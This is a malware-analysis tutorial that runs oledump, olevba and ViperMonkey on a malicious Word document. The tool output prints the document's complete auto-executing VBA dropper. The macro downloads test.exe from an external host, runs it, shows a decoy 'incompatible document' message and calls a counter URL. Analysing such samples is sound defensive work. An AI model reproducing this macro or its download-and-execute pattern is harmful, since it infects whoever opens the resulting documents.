# MS Office malware analysis


## Identification & analysis of MS Office file

### oledump.py

* Download : https://github.com/DidierStevens/DidierStevensSuite

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin 
  1:       125 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     28579 '1Table'
  5:    457587 'Data'
  6:       367 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M    5221 'Macros/VBA/ThisDocument'
  9:      2775 'Macros/VBA/_VBA_PROJECT'
 10:      2196 'Macros/VBA/__SRP_0'
 11:       200 'Macros/VBA/__SRP_1'
 12:      1280 'Macros/VBA/__SRP_2'
 13:       356 'Macros/VBA/__SRP_3'
 14:       514 'Macros/VBA/dir'
 15:     14920 'WordDocument'
 ```
 
 ```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin -s 8 -v
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Option Explicit
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long, _
ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _
ByVal HQTLDG As Long) As Long
Sub AutoOpen()
    Auto_Open
End Sub
Sub Auto_Open()
SNVJYQ
End Sub
Public Sub SNVJYQ()
    OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.exe"
End Sub
Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
    Dim HRKUYU, lala As Long
    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
    If HRKUYU = 0 Then OGEXYR = True
    Dim YKPZZS
    YKPZZS = Shell(PHHWIV, 1)
    MsgBox "El contenido de este documento no es compatible con este equipo." & vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no compatible"
    lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Environ("TMP") & "\lkjljlljk", 0, 0)
    Application.DisplayAlerts = False
    Application.Quit
End Function
Sub Workbook_Open()
    Auto_Open
End Sub
```


## VBA macro analysis

### olevba

* Download : https://github.com/decalage2/oletools

```
eloi@Null2Root:~/Desktop/Tools/Malware$ olevba --analysis --decode 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba 
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
TXT:MASI---- 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba
===============================================================================
FILE: 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba
Type: Text
-------------------------------------------------------------------------------
VBA MACRO 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba 
in file: 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba - OLE stream: ''
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
| AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |
| AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | Environ              | May read system environment variables   |
| Suspicious | URLDownloadToFileA   | May download files from the Internet    |
| Suspicious | Lib                  | May run code from a DLL                 |
| IOC        | http://germanya.com. | URL                                     |
|            | ec/logs/test.exe     |                                         |
| IOC        | http://germanya.com. | URL                                     |
|            | ec/logs/counter.php  |                                         |
| IOC        | test.exe             | Executable file name                    |
| IOC        | sfjozjero.exe        | Executable file name                    |
+------------+----------------------+-----------------------------------------+

```

### vipermonkey

* Download : https://github.com/decalage2/ViperMonkey

```
eloi@Null2Root:~/Desktop/Tools/Malware/ViperMonkey-master/vipermonkey$ python vmonkey.py ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin 
vmonkey 0.06 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Option Explicit
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long, ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, ByVal HQTLDG As Long) As Long
Sub AutoOpen()
    Auto_Open
End Sub
Sub Auto_Open()
SNVJYQ
End Sub
Public Sub SNVJYQ()
    OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.exe"
End Sub
Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
    Dim HRKUYU, lala As Long
    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
    If HRKUYU = 0 Then OGEXYR = True
    Dim YKPZZS
    YKPZZS = Shell(PHHWIV, 1)
    MsgBox "El contenido de este documento no es compatible con este equipo." & vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no compatible"
    lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Environ("TMP") & "\lkjljlljk", 0, 0)
    Application.DisplayAlerts = False
    Application.Quit
End Function
Sub Workbook_Open()
    Auto_Open
End Sub

-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub AutoOpen (): 1 statement(s)
INFO     parsed Sub Auto_Open (): 1 statement(s)
INFO     parsed Sub SNVJYQ (): 1 statement(s)
INFO     parsed Function OGEXYR ([XSTAHU as String, PHHWIV as String]): 9 statement(s)
INFO     parsed Sub Workbook_Open (): 1 statement(s)
Module None
  Sub AutoOpen (): 1 statement(s)
  Sub SNVJYQ (): 1 statement(s)
  Sub Workbook_Open (): 1 statement(s)
  Sub Auto_Open (): 1 statement(s)
  Function OGEXYR ([XSTAHU as String, PHHWIV as String]): 9 statement(s)
  External Function URLDownloadToFileA ([FVQGKS as Long, WSGSGY as String, IFRRFV as String, NCVOLV as Long, HQTLDG as Long]) from urlmon.dll alias 

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Found Entry Point - params 'auto_open' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Found Entry Point - params 'workbook_open' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Found Entry Point | auto_open                 |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Found Entry Point | workbook_open             |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
+-------------------+---------------------------+---------------------------+
```

## PE file extraction from MS Office malware

